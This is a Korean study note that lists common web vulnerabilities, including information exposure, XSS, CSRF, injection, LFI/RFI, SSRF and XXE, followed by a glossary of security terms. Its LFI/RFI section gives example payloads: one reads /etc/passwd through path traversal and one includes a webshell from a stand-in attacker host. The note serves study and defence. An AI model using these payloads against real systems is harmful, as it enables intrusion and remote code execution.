## Web Vuln. Checklist & Security Terminology

---



## Web Vuln. Checklist

---

### 1. 단순 정보 노출

**1.1. 불필요 파일/페이지 노출**

- 불필요한 파일/페이지 노출은 말 그대로 웹 사이트의 민감정보가 의도치 않게 노출되는 취약점을 의미한다.
- 불필요한 파일 : 애플리케이션 설치시 기본적으로 제공되는 매뉴얼, 기본 페이지, 소스 백업 파일 등을 의미하며 이를 통해 시스템 관련 정보 혹은 내부 프로그램 로직등이 노출될 수 있는 간접적 위험을 제공할 수 있다.

**1.2. 부적절한 로그인 실패 메시지**

- 부적절한 로그인 실패 메시지는 공격자에게 계정관련 정보를 제공할 수 있다.
- 입력한 아이디가 존재하는지, 비밀번호가 맞는지 모두를 알 수 없도록 '해당되는 아이디가 없습니다', '비밀번호가 틀렸습니다'가 아닌 'ID 또는 PW가 잘못되었습니다'라는 실패메시지를 출력하도록 한다.

**1.3. 에러메시지 노출**

- 해커가 의도적인 에러를 유발하였을 때 적절한 예외처리를 하지않아 출력되는 에러정보에 중요정보가 포함되어 공격에 도움되는 정보가 노출될 수 있는 보안약점

**1.4. Default Page 노출**

- 애플리케이션 설치시 기본적으로 설치되는 샘플 페이지, 디폴트 페이지, 관리자 페이지 등을 제어하지 않아 웹 서버에 대한 정보를 제공하게 되는 보안약점



### 2. 중요 정보 노출

**2.1. 중요정보 평문 전송**

- 사용자 또는 시스템의 중요정보가 포함된 데이터를 평문으로 송수신 할 경우, 통신채널 스니핑을 통해 인가되지 않은 사용자에게 해당 데이터가 노출될 수 있는 보안약점
- `Wireshark`로 보이는 패킷에 암호화되어 알아볼 수 없도록 되어있지 않고 일반적인 문자가 캡쳐된다면 취약한 것.



**2.2. 중요정보 평문 노출**

- 비밀번호, 개인정보와 같은 중요정보를 암호화하여 저장하지 않아 정보가 노출될 수 있는 보안약점



**2.3. 파일 다운로드**

- 홈페이지 상에서 파일을 다운로드 받는 `asp, jsp, php` 프로그램에서 입력되는 경로를 검증하지 않는 경우 임의의 위치에 존재하는 파일을 열람하거나 다운받을 수 있는 보안약점



**2.4. 디렉터리 리스팅**

- 웹 서버 운영시 특정 디렉터리에 초기화 파일이 없을 경우 `(index.html, default.html, ...etc)` 해당 디렉터리의 파일 
  리스트를 브라우저에게 보여주게 되는 보안약점
- 구조 파악 & 민감정보가 포함된 파일 노출 -> 보안 위협



### 3. 취약한 인증 및 권한

---

**3.1. Cross-Site Script**

- 공격자가 <u>웹 사이트에 스크립트를 삽입</u>하여 의도치 않은 행동을 수행하거나 민감정보 탈취가 가능한 보안약점
- XSS의 공격대상은 클라이언트



**3.2. Cross-Site Request Forgery (CSRF)**

- 클라이언트가 자신의 의지와는 무관하게 공격자가 의도한 행위(삽입,삭제,등록 등)를 특정 웹사이트에 요청하게 만드는 공격



**3.3. 프로세스 검증 누락**

- 애플리케이션의 계획된 플로우 통제를 우회하는 것을 허가하는 보안약점.



### 4. 원격 명령실행

---

**4.1. Command Injection**

- `OS` 명렁어를 삽입하고 요청을 보내 웹 서버에서 실행시키는 취약점



**4.2 SQL Injection **

- 변조된 SQL언어를 사용해 DB내 데이터를 열람하거나 삽입&삭제하는 보안약점



**4.3. Local File Inclusion / Remote File Inclusion (LFIRFI)**

- 공격 대상 서버에 위치한 파일을 포함시켜 읽어오도록 하는 공격

- 파일이 존재하는 위치가 로컬인지 리모트인지에 따라 나뉨.

>**LFI** Ex) example.com/index.jsp?file=../../../../../../etc/passwd
>
>**RFI** Ex) example.com/index.jsp?file=http://evil.example.com/webshell.txt



**4.4. File Upload**

- 서버 사이드 언어로 개발된 프로그램을 업로드하여 실행시킬 수 있는 취약점



**4.5. Server-Side Request Forgery(SSRF)**

- 서버 사이드에서 이루어지는 `Request`를 변조하여 해커가 의도한 서버로 요청이 가게 하거나 요청 내용을 변경할 수 있는 공격
- 사용자의 입력을 받아 서버가 직접 다른 웹 또는 포트에 접근하여 데이터를 가져오는 기능들에서 주로 발생함



**4.6. XXE Injection**

- XXE : `XML External Entity` 
- XML : `Extensible Markup Language`로 다른 특수한 목적을 갖는 `Markup Language`를 만드는데 사용하는 언어
- 즉 XML 외부 요소를 삽입하는 공격
- XML 문서에서 동적으로 외부 URI 리소스를 포함시킬 수 있는 `external entity`를 사용하여 서버의 로컬파일 열람등을 유발할 수 있는 취약점으로 XML Request를 파싱하는 페이지에서 발생한다.



**4.7. 검증되지 않은 Redirect/Forward**

- 사용자의 입력값에 대한 검증 없이 리다이렉트 처리시 발생하는 취약점.
- 악의적인 URL로 렌더링 될 수 있는 취약점 존재.





## Security Terminology

---

**민감정보** : 사상, 신념, 노동조합&정당가입, 건강정보, 유전정보, 범죄경력 정보 등 그 밖의 <u>정보주체의 사생활을 현저히 침해할 우려가 있는 개인정보</u>

**고유식별정보** : <u>주민등록번호, 여권번호, 운전면허번호, 외국인등록번호</u>

**인증/인가** : 

- 인증 : 통제된 자원에 접근시, 등록된 사용자 인지 여부를 확인하는 것. -> 로그인

- 인가 : 접근 이후, 인증된 사용자에게 권한을 부여하는 것.

  인증을 거친 이후 인증된 사용자에게 특정한 권한을 부여하는것이 인가

**위협/위험/취약점**

- 위협 : 자산에 손실을 발생시킬 수 있는 원인 또는 행위
- 위험 : 위협이 발생할 수 있는 가능성
- 취약점 : 위협에 의해 손실이 발생하게 되는 약점

**취약점이 존재하지 않는다면 위협은 위험이 될 수 없다.**